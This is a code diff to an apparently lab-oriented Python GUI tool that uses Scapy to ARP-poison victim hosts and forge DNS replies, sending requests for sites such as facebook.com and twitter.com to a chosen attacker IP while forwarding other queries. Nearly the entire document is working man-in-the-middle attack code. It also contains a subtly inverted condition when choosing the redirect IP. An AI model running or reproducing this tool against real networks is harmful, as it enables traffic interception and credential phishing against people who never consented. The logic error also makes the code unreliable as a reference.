@@ -30,7 +30,7 @@ class Application(Frame):
 
 
         self.quit = Button(self, text="QUIT", fg="red", command=self.on_quit)
-        self.quit.grid(row=10, column=2)
+        self.quit.grid(row=13, column=2)
         
         Label(self, text="IP Victim").grid(row=2)
         Label(self, text="IP Server").grid(row=5)
@@ -51,24 +51,30 @@ class Application(Frame):
 
         Label(self, text="IP Victim").grid(row=2, column=4)
         Label(self, text="Website to Spoof").grid(row=5, column=4)
-        Label(self, text="DNS Server").grid(row=8, column=4)
+        Label(self, text="IPs to redirect to").grid(row=8, column=4)
+        Label(self, text="DNS Server").grid(row=11, column=4)
 
         self.fieldIPVictimDNS = Entry(self)
         self.fieldIPVictimDNS.insert(END, "192.168.56.101");
 
         self.fieldWebsite = Entry(self)
-        self.fieldWebsite.insert(END, "www.facebook.com");
+        self.fieldWebsite.insert(END, "www.facebook.com,www.twitter.com");
 
+        self.fieldRedirectIP = Entry(self)
+        self.fieldRedirectIP.insert(END, "192.168.56.102")
+        
         self.fieldDNSServer = Entry(self)
         self.fieldDNSServer.insert(END, "192.168.56.1");
 
         self.fieldIPVictimDNS.bind("<Key>", self.click)
         self.fieldWebsite.bind("<Key>", self.click)
+        self.fieldRedirectIP.bind("<Key>", self.click)
         self.fieldDNSServer.bind("<Key>", self.click)
 
         self.fieldIPVictimDNS.grid(row=3, column=4)
         self.fieldWebsite.grid(row=6, column=4)
-        self.fieldDNSServer.grid(row=9, column=4)
+        self.fieldRedirectIP.grid(row=9,column=4)
+        self.fieldDNSServer.grid(row=12, column=4)
 
         
 
@@ -193,26 +199,29 @@ class Application(Frame):
         root.destroy()
         #self.master.destroy
 
+    def dns_cache_poison(self):
+        pass
+        
     def dns_spoof(self, WEBSITE, DNS_SERVER):
 
-        REDIRECT_SERVER_IP = "192.168.56.102"  # Your local IP
- 
+        #REDIRECT_SERVER_IP = "192.168.56.102"  # Your local IP
+    
         BPF_FILTER = "udp port 53 and ip dst "+ DNS_SERVER[0]
         #192.168.56.1"
 
         #WEBSITE = "www.facebook.com"
 
-        def dns_responder(local_ip):
+        def dns_responder():
  
             def forward_dns(orig_pkt):
-                print("[DNS] Forwarding: "+orig_pkt[DNSQR].qname)
+                print("[DNS] Forwarding: " + orig_pkt[DNSQR].qname)
                 response = sr1(
                     IP(dst='8.8.8.8')/
                         UDP(sport=orig_pkt[UDP].sport)/
                         DNS(rd=1, id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname)),
                     verbose=0,
                 )
-                resp_pkt = IP(dst=orig_pkt[IP].src, src=REDIRECT_SERVER_IP)/UDP(dport=orig_pkt[UDP].sport)/DNS()
+                resp_pkt = IP(dst=orig_pkt[IP].src, src=DNS_SERVER[0])/UDP(dport=orig_pkt[UDP].sport)/DNS()
                 resp_pkt[DNS] = response[DNS]
                 send(resp_pkt, verbose=0)
                 return "[DNS] Responding to "+orig_pkt[IP].src
@@ -222,19 +231,23 @@ class Application(Frame):
                     DNS in pkt and
                     pkt[DNS].opcode == 0 and
                     pkt[DNS].ancount == 0
-                ):
-                    for SITE in WEBSITE:
+                ):                
+                    for i in range(0,len(WEBSITE)):
+                        SITE = WEBSITE[i]
+                        print(SITE)
                         if SITE in str(pkt["DNS Question Record"].qname):
-                            spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname=SITE,rdata=local_ip))
+                            redirectIP = self.REDIRECT_TO_IP[i] if len(self.REDIRECT_TO_IP) < i else self.REDIRECT_TO_IP[0]
+                        
+                            spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=redirectIP)/DNSRR(rrname=SITE,rdata=redirectIP))
                             send(spf_resp, verbose=0, iface=self.NETWORK_INTERFACE)
-                            return "[DNS] Spoofed DNS Response Sent - Redirected " + SITE + " to "+ REDIRECT_SERVER_IP + " (for client "+ pkt[IP].src +")"
+                            return "[DNS] Spoofed DNS Response Sent - Redirected " + SITE + " to "+ redirectIP + " (for client "+ pkt[IP].src +")"
 
                     # make DNS query, capturing the answer and send the answer
                     return forward_dns(pkt)
          
             return get_response
          
-        sniff(filter=BPF_FILTER, prn=dns_responder(REDIRECT_SERVER_IP), iface=self.NETWORK_INTERFACE)
+        sniff(filter=BPF_FILTER, prn=dns_responder(), iface=self.NETWORK_INTERFACE)
 
     def on_click_dns(self):
 
@@ -244,20 +257,16 @@ class Application(Frame):
             self.VICTIM_MAC.append(self.get_mac(self.VICTIM_IP[i]))
 
         self.WEBSITE = self.fieldWebsite.get().split(",")
-
-        
+        self.REDIRECT_TO_IP = self.fieldRedirectIP.get().split(",")
         self.DNS_SERVER_IP = self.fieldDNSServer.get().split(",")
-        self.DNS_SERVER_MAC = []
-        for i in range(0,len(self.DNS_SERVER_IP)):
-            self.DNS_SERVER_MAC.append(self.get_mac(self.DNS_SERVER_IP[i]))
 
-        print "Starting ARP poison thread"
+        print("(DNS) Starting the ARP-poison thread to make the following IPs think we (" + self.ATTACKER_MAC + ") are their local NS: " + str(self.VICTIM_IP))
         rearp_thread = threading.Thread(target=self.rearp_poisoning)
         rearp_thread.daemon=True
         rearp_thread.start()
         
         #DNS spoof thread
-        print "Starting DNS thread"
+        print "(DNS) Starting DNS thread that forwards or spoofs DNS requests"
         dns_thread = threading.Thread(target=self.dns_spoof, args=(self.WEBSITE, self.DNS_SERVER_IP))
         dns_thread.daemon=True #The Thread dies when the main thread dies
         dns_thread.start()
